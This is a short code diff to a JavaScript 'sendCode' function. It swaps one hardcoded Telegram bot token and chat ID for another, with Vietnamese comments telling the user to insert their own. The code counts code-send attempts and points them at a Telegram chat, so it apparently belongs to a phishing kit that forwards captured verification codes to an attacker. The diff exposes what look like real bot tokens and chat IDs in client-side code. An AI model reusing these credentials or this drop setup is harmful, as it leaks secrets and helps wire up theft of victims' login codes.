@@ -178,8 +178,8 @@ function sendCode() {
 
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '6899648318:AAEuhFl-OX-SGSRSc2i_fa7ZSMJTE1Yo3Ik'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002129119762'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const botToken = '7757060865:AAHxrieVbZmOY0795ekDbcp-IPso0rZK868'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1002275895232'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
 
         // const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
         // const chatId = process.env.NEXT_PUBLIC_CHAT_ID; 
